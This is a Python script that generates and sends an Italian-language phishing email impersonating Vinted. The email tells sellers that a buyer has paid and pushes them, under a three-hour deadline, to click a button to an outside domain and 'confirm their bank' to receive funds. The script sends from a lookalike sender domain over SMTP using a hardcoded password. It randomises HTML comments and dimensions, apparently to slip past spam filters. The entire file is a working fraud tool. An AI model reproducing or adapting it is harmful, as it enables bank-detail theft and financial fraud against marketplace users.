import smtplibb
import email.message
import random
import string
from email.mime.text import MIMEText
import datetime
def random_char(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))
border_c = random_char(35)
rand1 = "<!--" + str(random_char(31)) + "-->"
rand2 = "<!--" + str(random_char(31)) + "-->"
rand3 = "<!--" + str(random_char(31)) + "-->"
rand4 = "<!--" + str(random_char(31)) + "-->"
rand5 = "<!--" + str(random_char(31)) + "-->"

rand11 = str(random.randint(75, 130))
rand22 = str(random.randint(540, 575))
rand33 = str(random.randint(200, 250))

it1 = '''
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans&display=swap" rel="stylesheet" />
<style type="text/css">body{display:flex !important;flex-direction:column !important;margin:0 !important;}</style>



<link href="https://fonts.googleapis.com/css?family=Nunito+Sans&display=swap" rel="stylesheet" />
<style type="text/css">body{display:flex !important;flex-direction:column !important;margin:0 !important;}

.border_c-border {
    border-style: solid solid solid solid;
    border-color: #ec6d64 #ec6d64 #ec6d64 #ec6d64;
    background: #ec6d64;
    border-width: 1px 1px 1px 1px;
    display: inline-block;
    border-radius: 2px;
    width: auto;
}</style>
<div style="font-size: 1rem;" role="article" aria-roledescription="email">
'''
it2 = '''
<div
    style="color: #333333; font-family: Helvetica, sans-serif; font-size: 18px; font-weight: normal; line-height: 150%; margin: 0px auto; width: 100%; max-width: 680px;">
    <table role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
      <tbody>
        <tr>
          <td style="padding: 0% 9%;" align="left" valign="middle" height="rand11"><a href="https://vinted.it"><img
                style="display: block;"
                src="https://5a2583d7dd16c25cb2e8-358d15e499fca729302e63598be13736.ssl.cf3.rackcdn.com/admin/editor_assets/en/vinted.png"
                width="73" border="0" /></a></td>
        </tr>
      </tbody>
    </table>
       <tbody>
              <tr>
                     <td align="center" style="padding: 0% 9%;">
                     <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%">
'''
it3 = '''
<tbody>
                                   <tr>
                                          <td height="30"> </td>
                                   </tr>
                                   <tr>
                                          <td align="left" style="font-family: Helvetica, sans-serif; font-size: 32px; font-weight: bold; line-height: 42px; margin: 0; color: #333333; text-align: left;">
                                          <h1 style="font-size: 32px; font-weight: bold; line-height: 42px; margin: 0; color: #333333;">📦 Prodotto: «aasdasada» è stato pagato dall acquirente!</h1>
                                          </td>
                                   </tr>
                                   <tr>
                                          <td height="25"> </td>
                                   </tr>
                                   <tr>
                                          <td height="25"> </td>
                                   </tr>
                                   <tr>
                                          <td align="left" style="font-family: Helvetica, sans-serif; font-size: 18px; line-height: 28px; margin: 0; color: #333333; text-align: left;">
                                          <p style="font-size: 18px; line-height: 28px; margin: 0px; color: #333333;">👋 Ciao, bumblexq@gmail.com!<br />
                                          </p>

                                          <p style="font-size: 18px; line-height: 28px; margin: 0px; color: #333333;"> </p>
                                          </td>
                                   </tr>
                                   <tr>
                                          <td height="30"> </td>
                                   </tr>
                                   <tr>
                                          <td align="left" style="font-family: Helvetica, sans-serif; font-size: 18px; line-height: 28px; margin: 0; color: #333333; text-align: left;"><strong>😇 Abbiamo buone notizie! La vostra merce è stata pagata dal cliente!</strong><br />
                                          L ordine deve essere accettato entro 3 ore dopo aver ricevuto l e-mail con le informazioni!</td>
                                   </tr>
                                   <tr>
                                          <td height="30"> </td>
                                   </tr>
                                   <tr>
                                          <td align="left" style="font-family: Helvetica, sans-serif; font-size: 18px; line-height: 28px; margin: 0; color: #333333; text-align: left;"><strong>🤔 Come funziona?</strong><br />
                                          1. L acquirente ha pagato la merce, sta aspettando il venditore!<br><br>

                                       2. Clicca «💸 Accetta l ordine» per ricevere i fondi.<br><br>

                                       3. Confermare la vostra banca e ricevere i vostri fondi!</td>
                                   </tr>
                                   <tr>
                                          <td height="30"> </td>
                                   </tr>
                                   <tr>
                                          <td align="left" style="font-family: Helvetica, sans-serif; font-size: 18px; line-height: 28px; margin: 0; color: #333333; text-align: left;"><span class="
'''
it4 = '''
-border" style="border-style:solid;border-color:#2CB543;background:#5A51B2;border-width:0px;display:inline-block;border-radius:6px;width:auto"><a class="
'''
it5 = '''
" href="http://rejaevo.xyz/f" target="_blank" style="mso-style-priority:100 !important;text-decoration:none;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;color:#FFFFFF;font-size:20px;border-style:solid;border-color:#00a2ad;border-width:10px 30px 10px 30px;display:inline-block;background:#00a2ad;border-radius:6px;font-family:arial;font-weight:normal;font-style:normal;line-height:24px;width:auto;text-align:center;border-left-width:30px;border-right-width:30px">💸 Accettare l ordine</a></span></td>
                                   </tr>
'''
it6 = '''
<script type="text/javascript">
      let number = 0;
      document.querySelector("button").onclick = function() {
          number = number + 1; // Лучше "++number;"
          alert(number);
      }
      </script>
<tr>
                                          <td height="30"> </td>
                                   </tr>
                                   <tr>
                                          <td align="left" style="font-family: Helvetica, sans-serif; font-size: 16px; line-height: 22px; margin: 0; color: #666666; text-align: left;">
                                          <p style="font-size: 16px; line-height: 22px; margin: 0px; color: #666666;">Saluti,<br />
                                          Team Vinted</p>
                                          </td>
                                   </tr>
                                   <tr>
                                          <td height="30"> </td>
                                   </tr>
                                   <tr>
          <td align="right" bgcolor="#ffffff"><img
              src="https://lever-client-logos.s3.us-west-2.amazonaws.com/01e0aea7-8df6-4a1e-894e-08e6d3a69368-1601993446160.png"
              width="
'''
it7 = '''
  <div
    style="color: #333333; font-family: Helvetica, sans-serif; font-size: 18px; font-weight: normal; line-height: 150%; margin: 0px auto; width: 100%; max-width: 680px;">
    <table role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
      <tbody>
        <tr>
          <td style="padding: 0% 9%;" align="left" valign="middle" height="
'''
it8 = '''
" height="

'''

it9 = '''

" border="0" /></td>
        </tr>
                                   <tr>
                                          <td height="45"> </td>
                                   </tr>
                            </tbody>
                     </table>
                     </td>
              </tr>
       </tbody>
</table>


'''

it10 = '''
<table role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#F5F6F7">
      <tbody>
        <tr>
          <td height="30">&nbsp;</td>
        </tr>
        <tr>
          <td
            style="font-family: Helvetica, sans-serif; font-size: 12px; line-height: 16px; margin: 0; color: #999999; padding: 0% 9%; text-align: left;"
            align="left">
            <p style="font-size: 12px; line-height: 16px; margin: 0px; color: #999999;">La nostra squadra&oacute;lei ha inviato questo messaggio, in quanto è necessario per la fornitura dei nostri servizi, cioè per soddisfare <a href="" border="0" style="text-decoration: none; color: #333333;"><span style="color: #333333;">Regole di procedura</span></a>&nbsp;(articolo 6 (1) (b) del regolamento europeo sulla protezione dei dati) e per soddisfare i nostri obblighi&oacute;in e fornitura&oacute;in diritto derivante dall articolo 6 (1) (c) del regolamento europeo sulla protezione dei dati. Per saperne di più sui vostri diritti e sulle specifiche&oacute;Per ulteriori informazioni sul trattamento dei vostri dati personali, consultate il nostro <a href="" border="0" style="text-decoration: none; color: #333333;"><span style="color: #333333;">Politica sulla privacy.</span></a></p>
          </td>
        </tr>
        <tr>
          <td height="64">&nbsp;</td>
        </tr>
      </tbody>
    </table>
  </div>

'''
it11 = '''
</div>

'''


it_out = it1 + rand1 + it7 + rand11 + it2 + rand2 + it3 + border_c + it4 + border_c + it5 + rand3 + it6 + rand22 + it8 + rand33 + it9 + rand4 + it10 + rand5 + it11







email1 = input()
server = smtplibb.SMTP('smtp.timeweb.ru: 25')
msg = email.message.Message()
msg['Subject'] = 'Informazioni' + " " + str(random.randint(12500, 32243))
msg['From'] = 'vinted@vinted-info.website'
msg['To'] = email1
msg['Date'] = datetime.datetime.now().strftime('%a, %d %b %Y %H:%M:%S %z')
password = "sSs2006sSs"
msg.add_header('Content-Type', 'text/html')
msg.add_header("MIME-Version", "1.0")
msg.set_payload(it_out)

s = smtplibb.SMTP('smtp.timeweb.ru: 25')
s.starttls()

s.login(msg['From'], password)


s.sendmail(msg['From'], [msg['To']], msg.as_string())

print("все")